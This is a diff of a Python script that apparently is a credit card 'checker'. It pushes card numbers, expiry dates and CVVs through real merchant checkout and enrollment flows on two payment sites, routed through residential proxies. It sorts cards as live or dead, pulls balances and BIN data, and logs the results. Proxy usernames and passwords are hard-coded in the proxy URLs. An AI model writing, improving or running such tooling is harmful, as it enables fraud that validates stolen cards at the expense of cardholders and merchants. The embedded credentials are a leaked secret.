@@ -120,6 +120,9 @@ class RequisicaoException2(Exception):
     def __init__(self):
         super().__init__()
 
+class RequisicaoException3(Exception):
+    def __init__(self):
+        super().__init__()
 
 def reteste(card, month, year, cvv):
         checker(card, month, year, cvv)
@@ -183,58 +186,12 @@ def Saldo(card, month, year, cvv):
         
         if response.status_code == 200:
             #time.sleep(5)
-            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
+            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium:qj77tznsi49h@brd.superproxy.io:22225'}
             #start_time = time.time() 
             #recap = criarTask()
 
-                
-            url = "https://www.eduwhere.com/coursedescription.php?courseID=12"
-
-            payload = {}
-            headers = {
-            'Host': 'www.eduwhere.com',
-            'Cookie': '_gid=GA1.2.1486401360.1714619899; CookieConsent={stamp:%27aOIRROpseivrSBYopU4n2XsO3qXdur9niS1mjATgzut1eSpT15/SYg==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1714619903153%2Cregion:%27br%27}; _gat_UA-905143-1=1; _ga=GA1.2.1025788957.1714619899; _ga_BXGEK2R94H=GS1.1.1714623164.2.1.1714623186.38.0.0',
-            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'referer': 'https://www.eduwhere.com/courses.php',
-            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-            'priority': 'u=0, i'
-            }
-
-            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
-            
-            
-            url = "https://www.eduwhere.com/secure/enroll.php?courseID=12"
-
-            payload = {}
-            headers = {
-            'Host': 'www.eduwhere.com',
-            'Cookie': '_gid=GA1.2.1486401360.1714619899; CookieConsent={stamp:%27aOIRROpseivrSBYopU4n2XsO3qXdur9niS1mjATgzut1eSpT15/SYg==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1714619903153%2Cregion:%27br%27}; _gat_UA-905143-1=1; _ga=GA1.2.1025788957.1714619899; _ga_BXGEK2R94H=GS1.1.1714623164.2.1.1714623186.38.0.0',
-            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'referer': 'https://www.eduwhere.com/coursedescription.php?courseID=12',
-            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-            'priority': 'u=0, i'
-            }
-
-            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
-
+             
+           
 
             url = "https://www.eduwhere.com/secure/enroll_info.php?courseID=12"
 
@@ -261,7 +218,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            
+            print(response.text)
                         
             url = f"https://www.eduwhere.com/secure/enroll_username_validate.php?username={username}"
 
@@ -283,7 +240,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
-
+            print(response.text)
 
             url = "https://www.eduwhere.com/secure/enroll_payment.php"
 
@@ -310,7 +267,8 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-                        
+            print(response.text) 
+                           
             url = "https://www.eduwhere.com/secure/enroll_payment.php"
 
             payload = "paypick=CC&paypicktransID=145594"
@@ -337,6 +295,8 @@ def Saldo(card, month, year, cvv):
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
             ssl_invoice_number = pegarItem(response.text, "name='ssl_invoice_number' id='ssl_invoice_number' value='","'")
+            print(response.text)
+            
             
             url = f"https://www.eduwhere.com/secure/enroll_cc_verify.php?ccnum={card}"
 
@@ -358,6 +318,8 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+            print(response.text)
+
 
             year = year[2:]
             url = "https://www.eduwhere.com/secure/enroll_payment_inter.php"
@@ -385,7 +347,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            
+            print(response.text)
             recap = SaldoTask()
             url = "https://www.eduwhere.com/secure/enroll_payment_confirm.php"
 
@@ -412,7 +374,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            
+            print(response.text)
             
             if 'RETRY' in response.text:
                 saldo = pegarItem(response.text, 'ssl_account_balance=','&')
@@ -495,7 +457,7 @@ def checker(card, month, year, cvv):
         
         
         if response.status_code == 200:
-            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
+            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
             start_time = time.time() 
             key = rkey()
             url = f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}"
@@ -522,6 +484,8 @@ def checker(card, month, year, cvv):
             
             if 'location' in response.headers:
                 loocation = response.headers.get('location')
+            elif 'timeout/y' in url:
+                RequisicaoException3()
 
 
             url = f"https://www.payzer.com{loocation}"
@@ -548,8 +512,9 @@ def checker(card, month, year, cvv):
             time.sleep(2)
             
             if  response.status_code == 302:
-                print(response.text)
                 raise RequisicaoException() 
+            elif 'timeout/y' in url:
+                RequisicaoException3()
             pm = pegarItem(response.text, 'name="nt" value="','"')
             
             
@@ -607,11 +572,13 @@ def checker(card, month, year, cvv):
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
             
             time.sleep(2)
+            if 'timeout/y' in url:
+                RequisicaoException3()
             
-            
-            if 'location' in response.headers:
+            elif 'location' in response.headers:
                 loocation = response.headers.get('location')          
-                               
+         
+                      
                 url = f"https://www.payzer.com{loocation}"
                 payload = {}
                 headers = {
@@ -662,6 +629,8 @@ def checker(card, month, year, cvv):
                 
                 if 'getSelectedFinancingProduct' in response.text:
                     raise RequisicaoException2()
+                elif 'timeout/y' in url:
+                    RequisicaoException3()
                 
                 #time.sleep(2)
                 elapsed_time = time.time() - start_time
@@ -683,13 +652,13 @@ def checker(card, month, year, cvv):
                     # #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                     # print(Fore.GREEN + f"{x} #JacaChecker") 
                     return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
-                elif 'Expired' in response.text:
-                    #saldousdo = Saldo(card, month, year, cvv)
-                    bin = api_bin(card[:6])              
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Expired"                    
-                    #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
-                    print(Fore.GREEN + f"{x} #JacaChecker") 
-                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
+                # elif 'Expired' in response.text:
+                #     saldousdo = Saldo(card, month, year, cvv)
+                #     # bin = api_bin(card[:6])              
+                #     # x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                    
+                #     # #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
+                #     # print(Fore.GREEN + f"{x} #JacaChecker") 
+                #     return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                         
                 elif 'error' in response.text:  
                     msg = pegarItem(response.text, 'reason: ','<')
@@ -723,6 +692,9 @@ def checker(card, month, year, cvv):
         #reteste(card, month, year, cvv)
     except RequisicaoException:
         print(Fore.LIGHTWHITE_EX + f"Bad Request ({key}): {card}|{month}|{year}|{cvv}")
+        #reteste(card, month, year, cvv)
+    except RequisicaoException3:
+        print(Fore.LIGHTWHITE_EX + f"RETESTANDO Timeout Y ({key}): {card}|{month}|{year}|{cvv}")
         #reteste(card, month, year, cvv)
     except RequisicaoException2:
         print(Fore.LIGHTWHITE_EX + f"Final Error ({key}): {card}|{month}|{year}|{cvv}")
